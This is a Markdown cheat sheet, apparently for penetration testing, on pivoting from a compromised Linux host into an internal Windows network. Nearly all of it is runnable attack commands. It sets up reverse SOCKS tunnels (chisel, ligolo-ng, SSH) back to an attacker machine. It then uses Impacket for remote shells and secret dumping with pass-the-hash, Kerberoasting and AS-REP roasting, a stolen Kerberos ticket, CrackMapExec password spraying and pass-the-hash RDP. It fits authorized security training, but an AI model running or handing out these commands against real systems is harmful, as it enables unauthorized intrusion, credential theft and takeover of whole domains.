# Linux-to-Windows Pivoting via SOCKS + Impacket

When you compromise a Linux host that has internal network access, use it as a pivot point to attack Windows targets deeper in the network.

---

## Step 1: Establish SOCKS Proxy on Kali

### Option A: Chisel (Most Reliable)

```bash
# Kali: start chisel server with SOCKS5:
./chisel server --reverse --port 8888 --socks5

# Linux pivot: connect back and create SOCKS tunnel:
./chisel client KALI_IP:8888 R:socks
# Default SOCKS port on Kali: 127.0.0.1:1080
```

### Option B: Ligolo-ng

```bash
# Kali: start ligolo proxy:
./proxy -selfcert -laddr 0.0.0.0:11601

# Linux pivot: connect agent:
./agent -connect KALI_IP:11601 -ignore-cert

# In ligolo console:
>> session        # select session
>> start          # start tunnel
# Then add route: sudo ip route add 192.168.100.0/24 dev ligolo
```

### Option C: SSH SOCKS (If SSH Access to Pivot)

```bash
# Dynamic port forward — creates SOCKS5 on 127.0.0.1:9050:
ssh -D 9050 -N -q user@PIVOT_IP

# Or from Kali with a key:
ssh -i key.pem -D 9050 -N user@PIVOT_IP
```

---

## Step 2: Configure proxychains4

```bash
# /etc/proxychains4.conf:
[ProxyList]
socks5 127.0.0.1 1080    # Chisel/Ligolo default port
# OR
socks5 127.0.0.1 9050    # SSH dynamic forward default

# Test:
proxychains4 nmap -sT -Pn -p 445,5985,3389 192.168.100.10
```

---

## Step 3: Use Impacket Through the Proxy

**Critical:** Always use **hostnames** for Kerberos operations. For NTLM, IPs work fine.

```bash
# SMB shell (NTLM hash — use IP or hostname):
proxychains4 impacket-psexec DOMAIN/user@192.168.100.10 -hashes :NTHASH

# WMI (quieter than PSExec):
proxychains4 impacket-wmiexec DOMAIN/user:password@192.168.100.10

# Dump secrets remotely:
proxychains4 impacket-secretsdump DOMAIN/user@192.168.100.10 -hashes :NTHASH

# Kerberoasting through tunnel:
proxychains4 impacket-GetUserSPNs DOMAIN/user:password -dc-ip 192.168.100.1 -request

# AS-REP roasting:
proxychains4 impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip 192.168.100.1 -format hashcat

# SMB client (browse shares):
proxychains4 impacket-smbclient DOMAIN/user:password@192.168.100.10

# MSSQL:
proxychains4 impacket-mssqlclient DOMAIN/user:password@192.168.100.10

# WinRM (evil-winrm through proxy):
proxychains4 evil-winrm -i 192.168.100.10 -u user -H NTHASH
```

---

## Step 4: Kerberos Through Proxy

Kerberos needs special handling through a SOCKS proxy — UDP doesn't work well. Force TCP:

```bash
# /etc/krb5.conf — add to [libdefaults]:
[libdefaults]
    default_realm = CORP.COM
    dns_lookup_realm = false
    dns_lookup_kdc = false
    # Force TCP for Kerberos (required for proxy):
    no_addresses = true
    udp_preference_limit = 1

# Add DC to /etc/hosts:
echo "192.168.100.1 DC01.corp.com DC01" >> /etc/hosts

# Use through proxy:
export KRB5CCNAME=/tmp/stolen.ccache
proxychains4 impacket-psexec -k -no-pass corp.com/Administrator@DC01.corp.com
proxychains4 impacket-secretsdump -k -no-pass corp.com/Administrator@DC01.corp.com
```

---

## CrackMapExec Through Proxy

```bash
# Network scan / spray through proxy:
proxychains4 crackmapexec smb 192.168.100.0/24 -u administrator -H NTHASH

# Execute command on all matches:
proxychains4 crackmapexec smb 192.168.100.10 -u administrator -H NTHASH -x "whoami"

# WinRM:
proxychains4 crackmapexec winrm 192.168.100.10 -u user -H NTHASH
```

---

## RDP Through Proxy

```bash
# xfreerdp through SOCKS (use proxychains4):
proxychains4 xfreerdp /v:192.168.100.10 /u:Administrator /p:Password123 /cert-ignore +clipboard

# Pass-the-Hash RDP:
proxychains4 xfreerdp /v:192.168.100.10 /u:Administrator /pth:NTHASH /cert-ignore

# Alternative: SSH tunnel for RDP (if proxychains RDP is slow):
ssh -L 3389:192.168.100.10:3389 user@PIVOT_IP
# Then: xfreerdp /v:127.0.0.1 /u:Administrator /p:Password123
```

---

## Port Forwarding (When SOCKS Not Available)

```bash
# Forward a specific port through SSH:
# Local port 1433 → MSSQL target:
ssh -L 1433:192.168.100.50:1433 user@PIVOT_IP

# Then: impacket-mssqlclient DOMAIN/user:pass@127.0.0.1

# Multiple forwards at once:
ssh -L 5985:192.168.100.10:5985 -L 3389:192.168.100.10:3389 user@PIVOT_IP

# Meterpreter portfwd (from existing session):
meterpreter> portfwd add -l 5985 -r 192.168.100.10 -p 5985
# Then: evil-winrm -i 127.0.0.1 -u Administrator -H NTHASH
```

---

## Double Pivot (Pivot Through Pivot)

```bash
# Topology: Kali → Linux1 (DMZ) → Linux2 (Internal) → Windows DC

# Step 1: Chisel server on Kali (port 8888)
# Step 2: Connect Linux1 → Kali (creates SOCKS on Kali 127.0.0.1:1080)
# Step 3: From Linux1, connect another chisel to Kali for a second tunnel
#   OR: Use SSH -D from Linux2 through Linux1 to Kali

# Double pivot via SSH:
ssh -J user@Linux1 user@Linux2    # jump via Linux1 to Linux2
ssh -J user@Linux1 -D 9051 user@Linux2   # SOCKS from Linux2 via Linux1

# proxychains for double pivot (chain them):
[ProxyList]
socks5 127.0.0.1 1080    # first hop
socks5 127.0.0.1 9051    # second hop
```
